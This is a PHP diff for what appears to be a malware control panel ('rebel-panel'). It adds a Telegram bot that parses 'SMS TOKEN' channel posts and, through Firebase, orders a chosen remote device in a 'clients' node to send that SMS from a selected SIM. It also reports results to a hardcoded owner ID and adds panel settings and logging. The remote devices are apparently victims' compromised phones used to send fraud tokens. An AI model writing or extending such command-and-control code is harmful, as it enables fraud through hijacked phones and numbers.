@@ -2122,21 +2122,40 @@ function rebel_sms_token_file(): string
     return __DIR__ . '/rebel_sms_token.json';
 }
 
+function rebel_sms_token_defaults(): array
+{
+    return [
+        'enabled' => false,
+        'device_id' => '',
+        'database_url' => '',
+        'fb_name' => '',
+        'auth_key' => '',
+        'schema' => 'rabel',
+        'device_node' => 'clients',
+        'sim' => 1,
+        'log' => [],
+    ];
+}
+
 function rebel_sms_token_load(): array
 {
     $file = rebel_sms_token_file();
+    $defaults = rebel_sms_token_defaults();
     if (!is_file($file)) {
-        return ['enabled' => false, 'device_id' => '', 'database_url' => '', 'fb_name' => ''];
+        return $defaults;
     }
     $raw = file_get_contents($file);
     if ($raw === false || trim($raw) === '') {
-        return ['enabled' => false, 'device_id' => '', 'database_url' => '', 'fb_name' => ''];
+        return $defaults;
     }
     $data = json_decode($raw, true);
     if (!is_array($data)) {
-        return ['enabled' => false, 'device_id' => '', 'database_url' => '', 'fb_name' => ''];
+        return $defaults;
     }
-    return $data;
+    if (!isset($data['log']) || !is_array($data['log'])) {
+        $data['log'] = [];
+    }
+    return array_merge($defaults, $data);
 }
 
 function rebel_sms_token_save(array $config): void
@@ -2146,6 +2165,304 @@ function rebel_sms_token_save(array $config): void
         json_encode($config, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE),
         LOCK_EX
     );
+}
+
+function rebel_sms_token_public_config(array $config): array
+{
+    return [
+        'enabled' => !empty($config['enabled']),
+        'device_id' => (string)($config['device_id'] ?? ''),
+        'database_url' => (string)($config['database_url'] ?? ''),
+        'fb_name' => (string)($config['fb_name'] ?? ''),
+        'schema' => (string)($config['schema'] ?? 'rabel'),
+        'device_node' => (string)($config['device_node'] ?? 'clients'),
+        'sim' => max(1, (int)($config['sim'] ?? 1)),
+        'updated' => (int)($config['updated'] ?? 0),
+    ];
+}
+
+function rebel_sms_token_public_log(array $config, int $limit = 15): array
+{
+    $log = $config['log'] ?? [];
+    if (!is_array($log)) {
+        return [];
+    }
+    $out = [];
+    foreach (array_slice($log, 0, $limit) as $row) {
+        if (!is_array($row)) {
+            continue;
+        }
+        $out[] = [
+            'ts' => (int)($row['ts'] ?? 0),
+            'time' => !empty($row['ts']) ? date('d/m/Y h:i A', (int)$row['ts']) : '',
+            'ok' => !empty($row['ok']),
+            'to' => (string)($row['to'] ?? ''),
+            'message' => (string)($row['message'] ?? ''),
+            'error' => (string)($row['error'] ?? ''),
+            'source' => (string)($row['source'] ?? ''),
+        ];
+    }
+    return $out;
+}
+
+function rebel_sms_token_log_entry(array $entry): void
+{
+    $cfg = rebel_sms_token_load();
+    if (!isset($cfg['log']) || !is_array($cfg['log'])) {
+        $cfg['log'] = [];
+    }
+    array_unshift($cfg['log'], $entry);
+    $cfg['log'] = array_slice($cfg['log'], 0, 40);
+    rebel_sms_token_save($cfg);
+}
+
+/** Parse Telegram channel "SMS TOKEN" format: To + Message */
+function rebel_parse_sms_token(string $text): ?array
+{
+    $text = trim($text);
+    if ($text === '' || !preg_match('/SMS\s*TOKEN/i', $text)) {
+        return null;
+    }
+    $to = '';
+    if (preg_match('/(?:📞\s*)?To:\s*([+\d\s\-()]+)/iu', $text, $m)) {
+        $to = preg_replace('/\D/', '', $m[1]);
+    }
+    $msg = '';
+    if (preg_match('/(?:💬\s*)?Message:\s*(.+)/isu', $text, $m)) {
+        $msg = trim($m[1]);
+        $msg = preg_replace('/[━─_]{3,}.*$/su', '', $msg);
+        $msg = trim($msg);
+    }
+    if (strlen($to) < 10 || $msg === '') {
+        return null;
+    }
+    if (strlen($to) > 10) {
+        $to = substr($to, -10);
+    }
+    return ['to' => $to, 'message' => $msg];
+}
+
+function rebel_bot_token(): string
+{
+    static $token = null;
+    if ($token !== null) {
+        return $token;
+    }
+    $token = trim((string)getenv('REBEL_BOT_TOKEN'));
+    if ($token === '') {
+        $file = __DIR__ . '/rebel_bot_token.txt';
+        if (is_file($file)) {
+            $token = trim((string)file_get_contents($file));
+        }
+    }
+    return $token;
+}
+
+function rebel_bot_owner_id(): string
+{
+    static $owner = null;
+    if ($owner !== null) {
+        return $owner;
+    }
+    $owner = trim((string)getenv('REBEL_OWNER_ID'));
+    if ($owner === '') {
+        $owner = '8432393497';
+    }
+    return $owner;
+}
+
+function rebel_tg_api(string $method, array $params = []): array
+{
+    $botToken = rebel_bot_token();
+    if ($botToken === '') {
+        return ['ok' => false, 'error' => 'Bot token not configured'];
+    }
+    $url = 'https://api.telegram.org/bot' . $botToken . '/' . $method;
+    $payload = json_encode($params ?: new stdClass());
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $payload,
+            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
+            CURLOPT_TIMEOUT => 35,
+            CURLOPT_CONNECTTIMEOUT => 15,
+        ]);
+        $raw = curl_exec($ch);
+        curl_close($ch);
+        $data = json_decode($raw ?: '{}', true);
+        return is_array($data) ? $data : ['ok' => false];
+    }
+    $ctx = stream_context_create([
+        'http' => [
+            'method' => 'POST',
+            'header' => "Content-Type: application/json\r\n",
+            'content' => $payload,
+            'timeout' => 35,
+        ],
+    ]);
+    $raw = @file_get_contents($url, false, $ctx);
+    $data = json_decode($raw ?: '{}', true);
+    return is_array($data) ? $data : ['ok' => false];
+}
+
+function rebel_tg_send(string $chatId, string $text): array
+{
+    if ($chatId === '') {
+        return ['ok' => false];
+    }
+    return rebel_tg_api('sendMessage', [
+        'chat_id' => $chatId,
+        'text' => $text,
+        'parse_mode' => 'HTML',
+        'disable_web_page_preview' => true,
+    ]);
+}
+
+function rebel_bot_webhook_url(): string
+{
+    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
+    $script = $_SERVER['SCRIPT_NAME'] ?? '/rebel-panel/sex.php';
+    return $scheme . '://' . $host . $script . '?rebel_bot_webhook=1';
+}
+
+function rebel_sms_token_try_send(string $text, array $meta = []): bool
+{
+    $parsed = rebel_parse_sms_token($text);
+    if (!$parsed) {
+        return false;
+    }
+    $cfg = rebel_sms_token_load();
+    $source = (string)($meta['source'] ?? '');
+    if (empty($cfg['enabled'])) {
+        rebel_sms_token_log_entry([
+            'ts' => time(),
+            'ok' => false,
+            'to' => $parsed['to'],
+            'message' => $parsed['message'],
+            'error' => 'Auto token SMS disabled',
+            'source' => $source,
+        ]);
+        return true;
+    }
+    $dedup = md5($parsed['to'] . '|' . $parsed['message']);
+    foreach ($cfg['log'] as $row) {
+        if (!empty($row['dedup']) && $row['dedup'] === $dedup && (time() - (int)($row['ts'] ?? 0)) < 120) {
+            return true;
+        }
+    }
+    if (empty($cfg['device_id']) || empty($cfg['database_url'])) {
+        rebel_sms_token_log_entry([
+            'ts' => time(),
+            'ok' => false,
+            'to' => $parsed['to'],
+            'message' => $parsed['message'],
+            'error' => 'Device or Firebase not configured',
+            'source' => $source,
+        ]);
+        rebel_tg_send(rebel_bot_owner_id(), "❌ SMS TOKEN parsed but device not set.\nTo: <code>" . htmlspecialchars($parsed['to'], ENT_QUOTES, 'UTF-8') . "</code>\nPanel → Auto Token → Enable + select device");
+        return true;
+    }
+    $res = rebel_send_sms_to_device(
+        rtrim((string)$cfg['database_url'], '/'),
+        (string)($cfg['auth_key'] ?? ''),
+        (string)$cfg['device_id'],
+        max(1, (int)($cfg['sim'] ?? 1)),
+        $parsed['to'],
+        $parsed['message'],
+        (string)($cfg['schema'] ?? 'rabel'),
+        (string)($cfg['device_node'] ?? 'clients')
+    );
+    rebel_sms_token_log_entry([
+        'ts' => time(),
+        'ok' => !empty($res['ok']),
+        'to' => $parsed['to'],
+        'message' => $parsed['message'],
+        'device' => (string)$cfg['device_id'],
+        'source' => $source,
+        'dedup' => $dedup,
+        'error' => (string)($res['error'] ?? ''),
+    ]);
+    if (!empty($res['ok'])) {
+        $body = htmlspecialchars(mb_substr($parsed['message'], 0, 200), ENT_QUOTES, 'UTF-8');
+        rebel_tg_send(rebel_bot_owner_id(), "✅ <b>Auto SMS Sent</b>\n\n📞 To: <code>" . htmlspecialchars($parsed['to'], ENT_QUOTES, 'UTF-8') . "</code>\n💬 " . $body);
+    } else {
+        rebel_tg_send(rebel_bot_owner_id(), "❌ Auto SMS failed\nTo: <code>" . htmlspecialchars($parsed['to'], ENT_QUOTES, 'UTF-8') . "</code>\n" . htmlspecialchars((string)($res['error'] ?? 'Unknown'), ENT_QUOTES, 'UTF-8'));
+    }
+    return true;
+}
+
+function rebel_bot_norm_cmd(string $text): string
+{
+    $text = trim($text);
+    $text = preg_replace('/@\w+/i', '', $text);
+    return trim($text);
+}
+
+function rebel_bot_handle_command(array $update): bool
+{
+    $msg = $update['message'] ?? null;
+    if (!$msg) {
+        return false;
+    }
+    $fromId = (string)($msg['from']['id'] ?? '');
+    $chatId = (string)($msg['chat']['id'] ?? '');
+    $text = rebel_bot_norm_cmd((string)($msg['text'] ?? ''));
+    if ($text === '' || $fromId !== rebel_bot_owner_id()) {
+        return false;
+    }
+    if (preg_match('/^\/smstoken\s+(on|off)\b/i', $text, $m)) {
+        $cfg = rebel_sms_token_load();
+        $cfg['enabled'] = strtolower($m[1]) === 'on';
+        $cfg['updated'] = time();
+        rebel_sms_token_save($cfg);
+        $dev = $cfg['device_id'] ?: 'not set — use panel Set Device';
+        rebel_tg_send($chatId, $cfg['enabled']
+            ? "✅ Auto Token SMS <b>ON</b>\nAdd bot as admin to your Telegram channel.\nDevice: <code>" . htmlspecialchars($dev, ENT_QUOTES, 'UTF-8') . "</code>"
+            : '⏸ Auto Token SMS <b>OFF</b>');
+        return true;
+    }
+    if (preg_match('/^\/setdevice\s+(\S+)/i', $text, $m)) {
+        $cfg = rebel_sms_token_load();
+        $cfg['device_id'] = trim($m[1]);
+        $cfg['updated'] = time();
+        rebel_sms_token_save($cfg);
+        rebel_tg_send($chatId, "✅ Auto SMS device set:\n<code>" . htmlspecialchars($cfg['device_id'], ENT_QUOTES, 'UTF-8') . '</code>');
+        return true;
+    }
+    if (preg_match('/^\/smstoken\b/i', $text)) {
+        $cfg = rebel_sms_token_load();
+        $status = !empty($cfg['enabled']) ? 'ON' : 'OFF';
+        rebel_tg_send($chatId, "⚡ Auto Token SMS: <b>{$status}</b>\nDevice: <code>" . htmlspecialchars((string)($cfg['device_id'] ?: 'not set'), ENT_QUOTES, 'UTF-8') . "</code>\n\nCommands:\n/smstoken on|off\n/setdevice DEVICE_ID");
+        return true;
+    }
+    return false;
+}
+
+function rebel_bot_handle_update(array $update): bool
+{
+    if (!empty($update['channel_post']) || !empty($update['edited_channel_post'])) {
+        $post = $update['channel_post'] ?? $update['edited_channel_post'];
+        $text = trim((string)($post['text'] ?? $post['caption'] ?? ''));
+        if ($text !== '') {
+            rebel_sms_token_try_send($text, ['source' => 'channel', 'chat_id' => (string)($post['chat']['id'] ?? '')]);
+        }
+        return true;
+    }
+    $msg = $update['message'] ?? null;
+    if (!$msg) {
+        return false;
+    }
+    $text = trim((string)($msg['text'] ?? $msg['caption'] ?? ''));
+    if ($text !== '' && rebel_parse_sms_token($text)) {
+        rebel_sms_token_try_send($text, ['source' => 'message', 'chat_id' => (string)($msg['chat']['id'] ?? '')]);
+    }
+    if ($text !== '' && preg_match('/^\//', $text)) {
+        return rebel_bot_handle_command($update);
+    }
+    return $text !== '';
 }
 
 function rebel_sms_token_api_handle(): void
@@ -2162,11 +2479,19 @@ function rebel_sms_token_api_handle(): void
     $config = rebel_sms_token_load();
 
     if ($action === 'get') {
-        rebel_json_out(['ok' => true, 'config' => $config]);
+        rebel_json_out([
+            'ok' => true,
+            'config' => rebel_sms_token_public_config($config),
+            'log' => rebel_sms_token_public_log($config),
+            'webhook' => rebel_bot_webhook_url(),
+            'bot_configured' => rebel_bot_token() !== '',
+        ]);
     }
 
     if ($action === 'save') {
-        $config['enabled'] = !empty($body['enabled']);
+        if (array_key_exists('enabled', $body)) {
+            $config['enabled'] = !empty($body['enabled']);
+        }
         if (array_key_exists('device_id', $body)) {
             $config['device_id'] = trim((string)$body['device_id']);
         }
@@ -2176,9 +2501,36 @@ function rebel_sms_token_api_handle(): void
         if (array_key_exists('fb_name', $body)) {
             $config['fb_name'] = trim((string)$body['fb_name']);
         }
+        if (array_key_exists('auth_key', $body)) {
+            $config['auth_key'] = trim((string)$body['auth_key']);
+        }
+        if (array_key_exists('schema', $body)) {
+            $config['schema'] = strtolower(trim((string)$body['schema'])) ?: 'rabel';
+        }
+        if (array_key_exists('device_node', $body)) {
+            $config['device_node'] = trim((string)$body['device_node']) ?: 'clients';
+        }
+        if (array_key_exists('sim', $body)) {
+            $config['sim'] = max(1, (int)$body['sim']);
+        }
         $config['updated'] = time();
         rebel_sms_token_save($config);
-        rebel_json_out(['ok' => true, 'config' => $config]);
+        rebel_json_out([
+            'ok' => true,
+            'config' => rebel_sms_token_public_config($config),
+            'log' => rebel_sms_token_public_log($config),
+        ]);
+    }
+
+    if ($action === 'test') {
+        $sample = "SMS TOKEN\nTo: 9876543210\nMessage: Test auto token " . date('H:i:s');
+        rebel_sms_token_try_send($sample, ['source' => 'panel_test']);
+        $config = rebel_sms_token_load();
+        rebel_json_out([
+            'ok' => true,
+            'config' => rebel_sms_token_public_config($config),
+            'log' => rebel_sms_token_public_log($config),
+        ]);
     }
 
     rebel_json_out(['ok' => false, 'error' => 'Unknown action'], 400);
